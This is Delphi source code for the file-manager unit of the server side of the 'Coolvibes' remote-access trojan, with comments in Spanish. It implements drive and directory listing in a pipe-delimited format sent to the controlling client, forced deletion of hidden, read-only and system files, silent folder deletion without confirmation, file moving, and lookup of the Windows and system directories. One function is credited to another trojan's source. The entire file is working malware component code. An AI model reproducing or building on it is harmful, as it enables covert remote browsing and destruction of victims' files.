{Unit perteneciente al server troyano Coolvibes que contiene todas las funciones
que son usadas en el FileManager o Explorador de Archivos}
unit UnitFileManager;

interface

uses
  SysUtils,
  Windows,
  ShellApi;

function GetDrives: String;
function GetDirectory(const strPath: String): String;
function BorrarArchivo( s : String ): Boolean;
function BorrarCarpeta(DirName : string): Boolean;

implementation

function GetDrives: String;
var
  Drives: array[0..512] of Char;
  pDrive: PChar;
begin
  GetLogicalDriveStrings(512, Drives); //llena el arreglo con las unidades
  pDrive := Drives;
  while pDrive^ <> #0 do begin // mientras pDrive tenga algo...
    Result := Result + pDrive + IntToStr(GetDriveType(pDrive)) + '|';
    Inc(pDrive, 4);
  end;
end;

// ------------
// GetDirectory
// ------------
function GetDirectory(const strPath: String): String;
//Retorna la lista de archivos y carpetas de StrPath
var
  strFile, strDirectory: String;
  Listado : TSearchRec;
  shInfo : TSHFileInfo;
  sFileType : string;
begin
  SetErrorMode(SEM_FAILCRITICALERRORS); //Evita que se muestren errores criticos
  if not DirectoryExists(StrPath) then
  begin
    if GetLastError()=21 then  //Error al acceder a la unidad
      Result := 'MSG|Unidad no accesible!'
    else
      Result := 'MSG|El directorio no existe!';
    exit;
  end;
  if FindFirst(strPath+'*.*', faAnyFile, Listado) = 0 then  //Encuentra el primer archivo en StrPath
  begin
    repeat
      if (Listado.Attr and 16) = 16 then //Si es una carpeta...
      begin
        if Copy(Listado.Name, 1,1)<>'.' then  //y no empieza por '.'...
          StrDirectory := StrDirectory + #2 + Listado.Name + '|';//Copie a la string de Carpetas #2Carpeta|#2Carpeta2|
      end
      else //Si no es una carpeta, es un archivo...
      begin
        SHGetFileInfo(PChar(strPath + Listado.Name), 0, shInfo, SizeOf(shInfo), SHGFI_TYPENAME);
        sFileType := shInfo.szTypeName;
        StrFile :=StrFile + Listado.Name+ '|' +(IntToStr(Round(Listado.Size/1024)))+'|' + sFileType + '|'+ DateToStr(FileDateToDateTime(Listado.Time)) + '|';
        //Los archivos quedan en formato: Nombre|Tamaño|Tipo|Fecha|
        //El cliente debe saber que si encuentra un archivo, debe extraer el tamaño, el tipo y la fecha
      end;
      Result := StrDirectory + StrFile; //y envie todas las carpetas primero y despues los archivos
    until FindNext(Listado)<>0;
    SysUtils.FindClose(Listado);
  end
  else //Es decir, FindFirst(strPath+'*.*', faAnyFile, Listado) ES DIFERENTE de 0, osea que no hay archivos
    Result := '';
end;

function BorrarArchivo( s : String ): Boolean;
//Esta función la escribió aXLiTo
//http://www.littlewitchtrojan.cjb.net/
//y fue sacada de el código fuente de LittleWitch Trojan
var
  i: Byte;
begin
  Result := FALSE;
  if FileExists( s )then
    try
      //saco atributos para poder borrar un archivo sin importar que sea oculto, solo lectura o de sistema
      i := GetFileAttributes( PChar( s ) );
      i := i and $00000002;//faHidden;
      i := i and $00000001;//faReadOnly;
      i := i and $00000004;//faSysFile;
      SetFileAttributes( PChar( s ), i );
      Result := DeleteFile( Pchar( s ) );
    except
    end;
end;

Function BorrarCarpeta(DirName : string): Boolean;
var
  SHFileOpStruct : TSHFileOpStruct;
  DirBuf : array [0..255] of char;
begin
  try
    Fillchar(SHFileOpStruct,Sizeof(SHFileOpStruct),0) ;
    FillChar(DirBuf, Sizeof(DirBuf), 0 ) ;
    StrPCopy(DirBuf, DirName) ;
    with SHFileOpStruct do
    begin
      Wnd := 0;
      pFrom := @DirBuf;
      wFunc := FO_DELETE;
      fFlags := FOF_ALLOWUNDO;
      fFlags := fFlags or FOF_NOCONFIRMATION;
      fFlags := fFlags or FOF_SILENT;
    end;
    Result := (SHFileOperation(SHFileOpStruct) = 0);
  except
    Result := False;
  end;
end;

function MoverArchivo(oldPath, NewPath : string) : Boolean;
begin
  if oldPath = NewPath then //Duh!
    Result := False
  else
    Result := RenameFile(OldPath, NewPath);
end;

function GetWinDir: string;
var
  WinDir: PChar;
begin
  WinDir := StrAlloc(MAX_PATH);
  GetWindowsDirectory(WinDir, MAX_PATH);
  Result := string(WinDir);
  if Result[Length(Result)] <> '\' then
    Result := Result + '\';
  StrDispose(WinDir);
end;

function GetSysDir: string;
var 
  SysDir: PChar; 
begin
  SysDir := StrAlloc(MAX_PATH);
  GetSystemDirectory(SysDir, MAX_PATH);
  Result := string(SysDir); 
  if Result[Length(Result)] <> '\' then 
    Result := Result + '\'; 
  StrDispose(SysDir); 
end;

end.
